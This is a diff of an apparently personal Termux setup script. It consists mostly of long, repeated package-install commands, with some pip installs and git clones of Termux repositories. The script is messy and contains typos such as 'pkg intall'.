+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
 pkg install -y abook aerc aichat 
 pkg install -y alembic alpine amfora ani-cli 
 pkg install -y boinctui bombadillo bore cadaver catgirl 
@@ -170,7 +721,7 @@ pkg install -y ffsend finch geckodriver geographiclib
 pkg install -y glab-cli glow gomp gomuks hcloud hummin 
 pkg install -y hut ices inxi irssi jack-example-tools jfrog-cli jftui jira-go jql k9s 
 pkg install -y kakoune-lsp kubectl lastpass-cli lftp libc-client libc-client-static libcurl libhiredis libice 
-pkg install -y libmariadbcpp libmesode libmpdclient libnats-c 
+pkg install -y libmesode libmpdclient libnats-c 
 pkg install -y libneon libnfs libnl-cli 
 pkg install -y libnl-cli-static libshout 
 pkg install -y libsoup libsoup3 libssh2 libtd libusbmuxd libx11 libxcb libxrender 
@@ -205,26 +756,6 @@ pkg install -y openbabel
 
 pkg install -y openbox 
 
-pkg install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
-
-
-pkg install -y gcc-default-9 
-
-pkg install -y gnome-text-editor lxde-icon-theme marco mcfly pwgen xfce4-screensaver
-
-
-pkg install -y gcc-default
-pkg install -y gcc-default-10
-
-pkg install -y gcc-default-11
-
-pkg install -y gcc-default-12
-
-pkg install -y gcc-default-13
-
-pkg install -y gcc-default-14 
-
-
 pip install lolcat
 pip install autoclick
 pkg install -y python-scipy
@@ -240,7 +771,6 @@ pkg install -y tsu
 
 pkg install -y curl 
 pkg install -y curlie 
-pkg install -y gnurl 
 pkg install -y libcurl 
 pkg install -y libcurl-static 
 pkg install -y websocat
@@ -266,62 +796,6 @@ pkg intall -y gettext-static
 
 pkg intall -y gifsicle
 
-pkg intall -y kf6-kcompletion
-
-pkg intall -y kf6-kconfigwidgets
-
-pkg intall -y kf6-ki18n
-
-pkg intall -y kf6-kjobwidgets
-
-pkg intall -y kf6-ktextwidgets
-
-pkg intall -y kf6-kwidgetsaddons
-
-pkg intall -y kf6-purpose
-
-pkg intall -y libcwidget
-
-pkg intall -y libcwidget-static
-
-pkg intall -y libfinalcut
-
-pkg intall -y libgedit-gtksourceview
-
-pkg intall -y libnewt
-
-pkg intall -y libt3widget
-
-pkg intall -y libxaw
-
-pkg intall -y libxfce4ui
-
-pkg intall -y motif
-
-pkg intall -y nzbget
-
-pkg intall -y qcustomplot
-
-pkg intall -y qtermwidget
-
-pkg intall -y qtutilities
-
-pkg intall -y rust-std-aarch64-linux-android
-
-pkg intall -y rust-std-armv7-linux-androideabi
-
-pkg intall -y rust-std-i686-linux-android
-
-pkg intall -y rust-std-wasm32-unknown-unknown
-
-pkg intall -y rust-std-wasm32-wasi
-
-pkg intall -y rust-std-wasm32-wasip1
-
-pkg intall -y rust-std-wasm32-wasip2
-
-pkg intall -y rust-std-x86-64-linux-android
-pkg intall -y teleport-tsh 
 pkg intall -y uget 
 pkg intall -y vegeta 
 pkg intall -y wget 
@@ -494,24 +968,12 @@ pkg upgrade -y
 pkg in build-essential
 apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
 pkg upgrade -y
-pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo dpkg dpkg-perl dpkg-scanpackages libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgnutls libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libgnutls libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh  libmariadbcpp libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
-apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth gnugo go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
 apt install -y google-drive-upload
 apt install -y google-glog
 apt install -y googletest
 apt install -y translate-shell
-apt install -y aapt
-apt install -y aapt2
-
-apt install -y apt
-apt install -y dpkg
-apt install -y dpkg-perl
-apt install -y dpkg-scanpackages
-apt install -y libapt-pkg-perl
-apt install -y pkg-config
-
-apt install -y pkgfile
-apt install -y pkgtop
 
 apt install -y cfengine
 apt install -y cfengine-static python python2
@@ -537,10 +999,6 @@ git clone https://github.com/termux/wcwidth
 git clone https://github.com/termux/tergent
 git clone https://github.com/termux/tsu
 git clone https://github.com/pkgcore/pkgrepo
-open url https://www.boe.es/redes_sociales?pag=tw
-apt search pip
-pkg install matplotlib -y --aarch64
-pkg clear
 pkg upgrade -y 
 pkg install matplotlib
 apt install -y termux-am termux-am-socket termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools
@@ -557,8 +1015,8 @@ pkg upgrade -y
 pkg in build-essential
 apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
 pkg upgrade -y
-pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgnutls libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man md mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libgnutls libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh  libmariadbcpp libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
-apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth gnugo go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man md mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
 pkg install -y abook aerc aichat 
 pkg install -y alembic alpine amfora ani-cli 
 pkg install -y boinctui bombadillo bore cadaver catgirl 
@@ -570,7 +1028,7 @@ pkg install -y ffsend finch geckodriver geographiclib
 pkg install -y glab-cli glow gomp gomuks hcloud hummin 
 pkg install -y hut ices inxi irssi jack-example-tools jfrog-cli jftui jira-go jql k9s 
 pkg install -y kakoune-lsp kubectl lastpass-cli lftp libc-client libc-client-static libcurl libhiredis libice 
-pkg install -y libmariadbcpp libmesode libmpdclient libnats-c 
+pkg install -y libmesode libmpdclient libnats-c 
 pkg install -y libneon libnfs libnl-cli 
 pkg install -y libnl-cli-static libshout 
 pkg install -y libsoup libsoup3 libssh2 libtd libusbmuxd libx11 libxcb libxrender 
@@ -607,24 +1065,6 @@ pkg install -y openbox
 
 pkg install -y openbox-static rhythmbox rhythmbox-help shellinabox sing-box squeezelite the-powder-toy whiptail whitebox-tools xfce4-mailwatch-plugin 
 
-
-pkg install -y gcc-default-9 
-
-pkg install -y gnome-text-editor lxde-icon-theme marco mcfly pwgen xfce4-screensaver
-
-
-pkg install -y gcc-default
-pkg install -y gcc-default-10
-
-pkg install -y gcc-default-11
-
-pkg install -y gcc-default-12
-
-pkg install -y gcc-default-13
-
-pkg install -y gcc-default-14 
-
-
 pip install lolcat
 pip install autoclick
 pkg install -y python-scipy
@@ -640,7 +1080,6 @@ pkg install -y tsu
 
 pkg install -y curl 
 pkg install -y curlie 
-pkg install -y gnurl 
 pkg install -y libcurl 
 pkg install -y libcurl-static 
 pkg install -y websocat
@@ -894,8 +1333,8 @@ pkg upgrade -y
 pkg in build-essential
 apt install -y samba libcairomm-1.0 libcap libidn2 libisofs libjasper libjasper-utils libksba libnghttp2 libsigc++-2.0 libsigc++-3.0 libtpms libtvision libzmq openjpeg openjpeg-tools range-v3 stdman dirb fzf fzy glow harfbuzz harfbuzz-icu harfbuzz-utils lexter pick wuzz zziplib zzuf zzuf-static fatsort fcp libcap libhtmlcxx libice liblua51 libsm libx11 libx11-static libxau libxcb libxdmcp libxext libxfixes libxi libxrandr libxss libxt libzxing-cpp lua51 openjdk-21-x screen tergent x11-repo xorgproto
 pkg upgrade -y
-pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo libapt-pkg-perl pkg-config pkgfile pkgtop cfengine cfengine-static cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgnutls libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libgnutls libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh  libmariadbcpp libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
-apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth gnugo go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
+pkg install aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo cfm go-musicfox termux-am termux-api termux-api-static termux-apt-repo termux-auth termux-create-package termux-elf-cleaner termux-exec termux-gui-bash termux-gui-c termux-gui-package termux-gui-pm termux-keyring termux-licenses termux-services termux-tools acr autoconf resolv-conf rcs bat make cmake automake yasm flex figlet toilet ruby cowsay mpv ffmpeg clamav virustotal-cli agate autoconf-archive autoconf213 avra bastet bc blk-utils bore buf c-toxcore catdoc chrony cmocka cointop cppi croc cuetools curseofwar dasm distant djvulibre dnslookup docbook-xml faust fdm finch frotz frp fwknop gawk gegl geoip2-database geth gflags glib gmic gmic-gm golang-doc gpac graphicsmagick html2text htop imgflo ipfs jq keybase knockd leptonica libandroid-support libassuan libblkid libblocksruntime libblosc libcoap libcroco libcroco-static libdav1d libduckdb libduktape libgxps libical libliquid-dsp liblo libnl libpipeline libpoco libpolly librav1e librocksdb librocksdb-static libsignal-protocol-c libsoundtouch libspectre libspice-protocol libspice-server libsrt libssh2 libtalloc libtalloc-static libtbb libtermkey libtorrent-rasterbar libuv libvips libwayland libwayland-protocols libwslay libxml2 libxslt libzmq libzxing-cpp locustdb lsof luarocks m4 man mdns-scan microsocks mlocate mosh ncftp neocmakelsp neovim net-snmp ninja ocl-icd ocrad ocrad-static octave octave-static octomap octomap-static odt2txt osmctools pandoc pdfcpu pdftk peaclock photon-rss php-fpm picocom pipebuffer plutolang pocketbase procps procps-static procs procyon-decompiler proxychains-ng psmisc pup python-greenlet python-torchaudio rav1e ravencoin rdiff-backup rip ripgrep-all rtmpdump ruby-ri rust rust-docs scdoc shntool simulavr socat softether-vpn spiped srelay stunnel tesseract texinfo texlab tokei torsocks torsocks-static tree-sitter-vimdoc tree-sitter-vimdoc-static tsocks tty-clock ttyc unpaper utf8proc utf8proc-static uthash valadoc valadoc-static vobsub2srt websocat wireproxy wordgrinder xcb-proto xorgproto xsltproc yq blackbox discordo kcptun libnss libotr libseccomp libseccomp-static wasmer wireguard-tools xmlsec xmlsec-static yarn zssh libmaxminddb libnftnl libnpth libnspr libphysfs libplist libsmartcols libsqlite libt3key libtdb libtomcrypt libtommath libtool libunqlite libupscaledb libvidstab libwolfssl libzix llvm liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob monetdb libdb google-drive-upload google-glog googletest translate-shell aapt aapt2
+apt install -y game-repo science-repo aptly game-repo git-crypt libpcreposix myrepos root-repo science-repo termux-apt-repo termux-keyring tesseract rcs dart bat acr expect flex yasm autoconf liblz4 lz4 libllvm proxychains-ng debootstrap geth-utils asciinema gotty libandroid-glob libandroid-shmem libgfshare libgfshare-static libtool ired isync geoip2-database newsboat eigen libotr libsasl frotz gdb gdbm libnl libmnl netcdf-c lighttpd libmcrypt pulseaudio taglib subversion fakeroot fakeroot-static proot syncthing libevent wol utf8cpp utf8proc utfdecode util-linux util-linux-static asciidoc gbt geth go-findimagedupes goaccess gst-plugins-good python-static google-glog python2 python2-static vim-python weechat-python-plugin capstone-static boost-static bison-static && pip install colorama BeautifulSoup4 pycore solver z3 wh cs darth hacks
 apt install -y google-drive-upload
 apt install -y google-glog
 apt install -y googletest
@@ -942,17 +1381,15 @@ cd ~
 cd ~/termux-packages/scripts 
 bash ~/termux-packages/scripts/setup-termux.sh
 cd /data/data/com.termux/files/home/
